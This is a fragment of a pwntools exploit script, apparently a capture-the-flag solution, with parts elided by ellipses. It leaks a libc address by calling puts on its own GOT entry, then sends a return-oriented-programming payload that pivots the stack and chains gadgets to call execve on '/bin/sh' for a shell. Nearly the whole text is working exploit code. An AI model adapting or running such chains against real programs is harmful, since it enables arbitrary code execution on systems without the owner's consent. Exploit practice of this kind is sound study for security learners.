...
#0x0000000000400676 read

io.sendafter(">", flat(['11111111', 0x0000000000400793, elf.got['puts'], elf.plt['puts'], 0x0000000000400676, (80 - 40) * '1', stack, 0x00000000004006BE]))
...
'''
pop_rdx_pop_rsi_ret=libc_base+0x0000000000105169

payload=flat(['22222222', p64(pop_rdi_ret), p64(binsh_addr), p64(pop_rdx_pop_rsi_ret),p64(0),p64(0), p64(execve_addr), (80 - 7*8 ) * '2', stack - 48, 0x00000000004006BE])
